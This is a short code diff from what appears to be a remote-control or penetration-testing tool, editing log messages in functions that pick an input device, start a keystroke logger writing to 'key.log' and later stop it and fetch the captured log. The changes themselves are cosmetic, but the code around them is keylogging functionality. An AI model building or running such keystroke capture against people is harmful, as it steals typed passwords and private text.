@@ -1135,11 +1135,10 @@ def run_kl(ctx: Context):
         try:
             choice = int(choice_bytes.decode("utf-8").strip())
             if 0 <= choice < len(devices):
-                # Set the module-level logger_device
                 keys.logger_device = devices[choice]
                 print(f"[KL] Selected: {devices[choice].path} - {devices[choice].name}")
                 start_logger("key.log")
-                print("[KL] Logger started successfully")
+                print("[KL] Key logger started successfully")
             else:
                 print(f"[KL] Invalid choice {choice}")
         except ValueError as e:
@@ -1159,7 +1158,6 @@ def stop_kl(ctx: Context):
     import keys
     from keys import stop_logger, get_key_log_content
     
-    print("Stopping key logger...")
     stop_logger()
 
     source_ip = detect_source_ip(ctx.connected_to)
